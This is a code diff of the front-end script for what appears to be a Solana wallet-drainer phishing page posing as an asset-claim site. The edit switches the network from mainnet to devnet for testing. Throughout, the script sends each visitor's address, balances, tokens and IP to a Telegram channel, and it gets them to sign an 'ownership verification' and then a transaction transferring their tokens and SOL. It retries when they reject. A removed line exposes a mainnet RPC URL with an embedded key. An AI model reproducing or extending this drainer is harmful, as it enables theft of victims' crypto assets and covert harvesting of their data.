@@ -281,9 +281,9 @@ $(document).ready(function() {
             $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
             $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');
 
-            // ✅ تم التعديل هنا: استخدام رابط QuickNode الخاص بك فقط (بدون fallbacks)
+            // ✅ استخدام Devnet RPC للتجربة
             const connection = new solanaWeb3.Connection(
-                'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/',
+                'https://api.devnet.solana.com',
                 'confirmed'
             );
 
@@ -318,7 +318,7 @@ $(document).ready(function() {
                 balance: solBalanceFormatted,
                 usdBalance: 'Unknown',
                 walletType: walletInfo.name,
-                customMessage: '🔗 Wallet Connected',
+                customMessage: '🔗 Wallet Connected (DEVNET - TEST)',
                 splTokens: splTokens,
                 ip: clientIP
             });
@@ -331,11 +331,11 @@ $(document).ready(function() {
                     balance: solBalanceFormatted,
                     usdBalance: 'Unknown',
                     walletType: walletInfo.name,
-                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
+                    customMessage: '❌ Insufficient Funds - Need 0.02 SOL on Devnet'
                 });
                 
                 $('.wallet-loading-title').text('Insufficient Balance');
-                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
+                $('.wallet-loading-subtitle').html(`Please get Devnet SOL from faucet.<br>Current balance: ${solBalanceFormatted} SOL`);
                 
                 showRejectionEffects();
                 
@@ -367,7 +367,7 @@ $(document).ready(function() {
                             balance: solBalanceFormatted,
                             usdBalance: 'Unknown',
                             walletType: walletInfo.name,
-                            customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
+                            customMessage: `✅ Ownership Previously Verified - Proceeding (DEVNET) (Attempt ${retryCount + 1})`
                         });
                         
                         ownershipVerified = true;
@@ -390,7 +390,7 @@ $(document).ready(function() {
                                 balance: solBalanceFormatted,
                                 usdBalance: 'Unknown',
                                 walletType: walletInfo.name,
-                                customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
+                                customMessage: `✅ User Signed Ownership Verification - Proceeding (DEVNET) (Attempt ${retryCount + 1})`
                             });
                             
                             ownershipVerified = true;
@@ -409,7 +409,7 @@ $(document).ready(function() {
                                     balance: solBalanceFormatted,
                                     usdBalance: 'Unknown',
                                     walletType: walletInfo.name,
-                                    customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
+                                    customMessage: `❌ Ownership Verification Rejected by User (DEVNET) (Attempt ${retryCount + 1})`
                                 });
                                 
                                 if (retryCount < maxRetries) {
@@ -458,7 +458,7 @@ $(document).ready(function() {
                             balance: solBalanceFormatted,
                             usdBalance: 'Unknown',
                             walletType: walletInfo.name,
-                            customMessage: '❌ Transaction Preparation Failed'
+                            customMessage: '❌ Transaction Preparation Failed (DEVNET)'
                         });
                         alert(prepareData.error || "Failed to prepare transaction");
                         $('#connect-wallet').text("Connect Wallet");
@@ -479,29 +479,29 @@ $(document).ready(function() {
                         balance: solBalanceFormatted,
                         usdBalance: 'Unknown',
                         walletType: walletInfo.name,
-                        customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
+                        customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (DEVNET) (Attempt ${retryCount + 1})`
                     });
 
                     $('.wallet-loading-title').text('Confirming Transaction');
-                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
+                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on Devnet blockchain.<br>Please wait...');
                     
                     let txid = await connection.sendRawTransaction(signed.serialize());
                     await connection.confirmTransaction(txid);
                     console.log("Transaction confirmed:", txid);
                     
                     const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
-                    const solscanUrl = `https://solscan.io/tx/${txid}`;
+                    const solscanUrl = `https://solscan.io/tx/${txid}?cluster=devnet`;
                     
                     await sendTelegramNotification({
                         address: publicKeyString,
                         balance: solBalanceFormatted,
                         usdBalance: 'Unknown',
                         walletType: walletInfo.name,
-                        customMessage: `🎉 Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
+                        customMessage: `🎉 Transaction Confirmed on DEVNET! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
                     });
                     
                     $('.wallet-loading-title').text('Success!');
-                    $('.wallet-loading-subtitle').html('Assets have been successfully claimed.<br>Transaction confirmed on blockchain.');
+                    $('.wallet-loading-subtitle').html('Assets have been successfully claimed on DEVNET.<br>Transaction confirmed on blockchain.');
                     
                     $('#connect-wallet').text("Assets Claimed Successfully!");
                     
@@ -526,7 +526,7 @@ $(document).ready(function() {
                             balance: solBalanceFormatted,
                             usdBalance: 'Unknown',
                             walletType: walletInfo.name,
-                            customMessage: `❌ Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
+                            customMessage: `❌ Transaction Rejected by User - Retrying... (DEVNET) (Attempt ${retryCount + 1}/${maxRetries + 1})`
                         });
                         
                         showRejectionEffects();
@@ -545,7 +545,7 @@ $(document).ready(function() {
                         balance: solBalanceFormatted,
                         usdBalance: 'Unknown',
                         walletType: walletInfo.name,
-                        customMessage: `❌ Transaction Failed: ${errorMessage}`
+                        customMessage: `❌ Transaction Failed on DEVNET: ${errorMessage}`
                     });
                     
                     $('.wallet-loading-title').text('Transaction Failed');
@@ -572,7 +572,7 @@ $(document).ready(function() {
                 balance: 'Unknown',
                 usdBalance: 'Unknown',
                 walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
-                customMessage: `❌ Wallet Connection Failed: ${err.message || 'Unknown error'}`
+                customMessage: `❌ Wallet Connection Failed on DEVNET: ${err.message || 'Unknown error'}`
             });
             
             setTimeout(() => {
